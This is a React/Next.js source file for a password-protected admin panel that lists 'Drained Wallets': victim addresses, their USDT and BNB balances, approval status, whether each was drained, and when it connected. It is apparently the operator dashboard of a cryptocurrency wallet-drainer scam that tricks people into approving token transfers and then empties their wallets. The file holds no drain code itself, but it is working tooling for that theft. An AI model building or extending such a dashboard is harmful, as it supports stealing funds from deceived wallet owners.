"use client";

import { useState, useEffect } from "react";
import { Lock, Loader2, LogOut, Eye, EyeOff } from "lucide-react";

export default function AdminPanel() {
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [wallets, setWallets] = useState<any[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  // Check if already logged in
  useEffect(() => {
    if (typeof window !== "undefined" && sessionStorage.getItem("admin_logged_in") === "true") {
      setIsLoggedIn(true);
      fetchWallets();
    }
  }, []);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError("");

    try {
      const res = await fetch("/api/wallets", {
        method: "GET",
        headers: {
          "x-admin-key": password,
        },
      });

      if (res.ok) {
        setIsLoggedIn(true);
        sessionStorage.setItem("admin_logged_in", "true");
        const data = await res.json();
        setWallets(data.wallets || []);
      } else {
        setError("Invalid password");
      }
    } catch (err) {
      setError("Login failed. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  const fetchWallets = async () => {
    setLoading(true);
    setError("");
    try {
      const res = await fetch("/api/wallets", {
        headers: {
          "x-admin-key": sessionStorage.getItem("admin_temp_key") || "", // fallback if needed
        },
      });

      if (!res.ok) throw new Error("Failed to fetch");
      const data = await res.json();
      setWallets(data.wallets || []);
    } catch (err) {
      setError("Failed to load wallets");
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  const handleLogout = () => {
    sessionStorage.removeItem("admin_logged_in");
    setIsLoggedIn(false);
    setWallets([]);
    setPassword("");
  };

  if (!isLoggedIn) {
    return (
      <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center p-4">
        <div className="max-w-sm w-full bg-[#111] border border-gray-800 rounded-3xl p-8">
          <div className="flex justify-center mb-6">
            <div className="bg-gray-800 p-4 rounded-full">
              <Lock className="h-8 w-8 text-gray-400" />
            </div>
          </div>
          <h1 className="text-2xl font-bold text-center mb-2">Admin Control Panel</h1>
          <p className="text-gray-500 text-center mb-8">Enter admin password to continue</p>

          <form onSubmit={handleLogin}>
            <div className="relative mb-4">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter admin password"
                className="w-full bg-[#1c1c1c] border border-gray-700 rounded-2xl px-5 py-4 text-white focus:outline-none focus:border-[#4ade80]"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-4 top-4 text-gray-400 hover:text-white"
              >
                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-[#4ade80] text-black font-bold py-4 rounded-2xl hover:bg-[#22c55e] transition disabled:opacity-70"
            >
              {loading ? <Loader2 className="h-5 w-5 animate-spin mx-auto" /> : "Login"}
            </button>
          </form>

          {error && <p className="text-red-400 text-center mt-4">{error}</p>}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white p-4">
      <div className="max-w-6xl mx-auto">
        <div className="flex justify-between items-center mb-8">
          <div>
            <h1 className="text-3xl font-bold">Drained Wallets</h1>
            <p className="text-gray-500">Total: {wallets.length} wallets</p>
          </div>
          <button
            onClick={handleLogout}
            className="flex items-center gap-2 text-red-400 hover:text-red-500 transition"
          >
            <LogOut className="h-5 w-5" /> Logout
          </button>
        </div>

        {loading ? (
          <div className="flex justify-center py-20">
            <Loader2 className="h-8 w-8 animate-spin" />
          </div>
        ) : error ? (
          <p className="text-red-400 text-center py-12">{error}</p>
        ) : wallets.length === 0 ? (
          <div className="text-center py-20">
            <p className="text-gray-500 text-xl">No wallets collected yet.</p>
          </div>
        ) : (
          <div className="bg-[#111] rounded-3xl overflow-hidden border border-gray-800">
            <table className="w-full">
              <thead>
                <tr className="border-b border-gray-800 bg-[#1a1a1a]">
                  <th className="text-left p-5">Wallet Address</th>
                  <th className="text-left p-5">USDT Balance</th>
                  <th className="text-left p-5">BNB Balance</th>
                  <th className="text-left p-5">Status</th>
                  <th className="text-left p-5">Drained</th>
                  <th className="text-left p-5">Connected At</th>
                </tr>
              </thead>
              <tbody>
                {wallets.map((w: any, i) => (
                  <tr key={i} className="border-b border-gray-800 hover:bg-[#1a1a1a] transition">
                    <td className="p-5 font-mono text-sm break-all">{w.address}</td>
                    <td className="p-5 text-emerald-400 font-medium">
                      {w.usdt_balance ? Number(w.usdt_balance).toFixed(2) : "0.00"}
                    </td>
                    <td className="p-5 text-emerald-400 font-medium">
                      {w.bnb_balance ? Number(w.bnb_balance).toFixed(4) : "0.0000"}
                    </td>
                    <td className="p-5">
                      <span className={`px-3 py-1 rounded-full text-xs font-medium ${w.is_approved ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}`}>
                        {w.is_approved ? "Approved" : "Pending"}
                      </span>
                    </td>
                    <td className="p-5">
                      <span className={`px-3 py-1 rounded-full text-xs font-medium ${w.drained ? 'bg-red-500/20 text-red-400' : 'bg-gray-500/20 text-gray-400'}`}>
                        {w.drained ? "✅ Drained" : "No"}
                      </span>
                    </td>
                    <td className="p-5 text-gray-500 text-sm">
                      {w.connected_at ? new Date(w.connected_at).toLocaleString() : "-"}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
}